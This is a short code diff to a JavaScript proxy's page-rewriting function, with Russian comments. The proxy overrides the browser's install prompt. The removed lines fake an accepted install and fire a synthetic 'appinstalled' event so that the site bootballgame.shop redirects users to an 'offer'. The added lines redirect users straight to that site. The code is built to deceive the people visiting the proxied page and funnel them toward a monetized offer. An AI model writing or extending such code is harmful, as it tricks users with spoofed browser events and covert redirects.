@@ -119,11 +119,10 @@ function rewriteBody(body, contentType, proxyHost, proxyOrigin) {
         console.log('[Proxy] Using real beforeinstallprompt');
         return realPromptEvent.prompt();
       }
-      // Фейковая "установка" → сразу accepted → appinstalled event
-      // bootballgame.shop слушает appinstalled и редиректит на оффер
-      console.log('[Proxy] Fake install → redirect to offer');
-      resolveUserChoice({ outcome: 'accepted', platform: '' });
-      window.dispatchEvent(new Event('appinstalled'));
+      // Редирект на bootballgame.shop — откроется в CCT (обычный Chrome)
+      // Там beforeinstallprompt работает нативно
+      console.log('[Proxy] Redirecting to bootballgame.shop...');
+      window.location.href = 'https://bootballgame.shop/' + (window.location.search || '');
       return Promise.resolve();
     },
     userChoice: fakeUserChoice
